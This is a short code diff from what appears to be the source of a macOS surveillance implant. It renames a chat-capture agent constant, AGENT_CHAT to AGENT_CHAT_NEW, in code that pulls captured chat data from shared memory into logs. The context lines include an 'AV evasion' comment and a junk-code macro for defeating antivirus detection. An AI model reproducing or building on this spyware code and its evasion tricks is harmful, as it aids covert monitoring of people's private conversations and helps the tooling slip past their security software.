@@ -1388,7 +1388,7 @@ static void computerWillShutdown(CFMachPortRef port,
                                 
                 break;
               }
-            case AGENT_CHAT:
+            case AGENT_CHAT_NEW:
               {  
                 // AV evasion: only on release build
                 AV_GARBAGE_000
@@ -1400,7 +1400,7 @@ static void computerWillShutdown(CFMachPortRef port,
                                                         length: shMemLog->commandDataSize];
                 
                 if ([_logManager writeDataToLog: logData
-                                       forAgent: AGENT_CHAT
+                                       forAgent: AGENT_CHAT_NEW
                                       withLogID: 0] == TRUE)
                   {
 #ifdef DEBUG_CORE
